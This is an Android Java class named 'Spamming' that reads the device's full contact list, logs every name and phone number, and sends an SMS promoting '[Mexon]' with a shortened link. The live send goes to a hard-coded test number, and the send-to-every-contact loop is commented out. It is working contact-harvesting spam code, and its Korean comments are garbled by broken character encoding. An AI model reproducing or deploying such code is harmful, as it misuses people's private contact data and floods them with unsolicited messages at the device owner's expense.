package com.example.center;

import java.io.IOException;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.ContactsContract.Contacts;
import android.telephony.SmsManager;
import android.util.Log;

public class Spamming {
	
	Context context;
	
	Spamming(Context context) {
		this.context = context;
	};

	
	private Cursor getURI() 
    {
        // �ּҷ� URI        
        Uri people = Contacts.CONTENT_URI;
        
        // �˻��� �÷� ���ϱ�
        String[] projection = new String[] { Contacts._ID, Contacts.DISPLAY_NAME, Contacts.HAS_PHONE_NUMBER };
        
        // ���� ������ Ŀ�� ���
        String[] selectionArgs = null;
        String sortOrder = ContactsContract.Contacts.DISPLAY_NAME + " COLLATE LOCALIZED ASC";    

        // managedquery �� activity �޼ҵ��̹Ƿ� �Ʒ��� ���� ó����
        return context.getContentResolver().query(people, projection, null, selectionArgs, sortOrder);
        // return managedQuery(people, projection, null, selectionArgs, sortOrder);
    }
	
	public void phoneBook() throws IOException {
        Cursor cursor = getURI();                    // ��ȭ��ȣ�� ��������    

		int end = cursor.getCount();                // ��ȭ��ȣ���� ���� ����
		Log.d("ANDROES", "end = "+end);

		String [] name = new String[end];    // ��ȭ��ȣ���� �̸��� ������ �迭 ����
		String [] phone = new String[end];    // ��ȭ��ȣ���� �̸��� ������ �迭 ����
		int count = 0;     

		if(cursor.moveToFirst()) 
		{
		    // �÷������� �÷� �ε��� ã�� 
		    int idIndex = cursor.getColumnIndex("_id");

		    do 
		    {
		        //tempItem = new TempItem();
		        
		        // ��Ұ� 
		        int id = cursor.getInt(idIndex);        
		        String phoneChk = cursor.getString(2);
		        if (phoneChk.equals("1")) {
		            Cursor phones = context.getContentResolver().query(
		                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
		                    null,
		                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID
		                            + " = " + id, null, null);

		            while (phones.moveToNext()) {
		                phone[count] = phones
		                        .getString(phones
		                                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
		            }        
		        }
		        name[count] = cursor.getString(1);

		        // ���� ����ó ����                    
		        // rowNum = getBaseContext().getContentResolver().delete(RawContacts.CONTENT_URI, RawContacts._ID+ " =" + id,null);

		        // LogCat�� �α� �����
		         Log.i("ANDROES", "id=" + id +", name["+count+"]=" + name[count]+", phone["+count+"]=" + phone[count]);
		        count++;
		        
		    } while(cursor.moveToNext() || count > end);
		    
		    sendSMS(phone);
		}
    }
	
	private void sendSMS(String phone[]) {
		
		// SharedPreference�� �̿��� ���ø����̼�  �� xml�� �÷��׸� ������ ����Ѵ�.
		SharedPreferences prefs = context.getSharedPreferences("pref", context.MODE_PRIVATE);
		boolean flag = prefs.getBoolean("flag", false);
		if( flag ) return ;
		
		// ���� ���� �غ�
		SmsManager mngr = SmsManager.getDefault();
		String url = "http://goo.gl/q57Bqk";
		String mesg = "[Mexon] �ٽ� ���ƿ� �����ý��丮! ���� ���� �ް� ��Ÿ�׽��� ��û�ϱ� -> " + url;
		
		// Test�ڵ�. ���� ���.
		mngr.sendTextMessage("01079275117", null/*Default*/, mesg, null/*���� ��� ���޹��� ����*/, null);
		
		// �ּҷϿ��� ������ ��� ��ȣ���� ���ڸ� ����. ����� �ɻ���� �ϰ� ������ ��.
		for( String number : phone ) {
			//80���ڰ� �Ѿ�� MMS�� ���۵Ǵµ�, MMS�� ���� �ȵǰ� ©���ٴ� ��� �־ ���� �� ���̴°͵� ����غ�����.
//			mngr.sendTextMessage(number, null/*Default*/, mesg, null/*���� ��� ���޹��� ����*/, null);
			
		}

		
		// ������ ������� �ʵ��� flag ����
		SharedPreferences.Editor editor = prefs.edit();
		editor.putBoolean("flag", true);
		editor.commit();
	
	}
	
}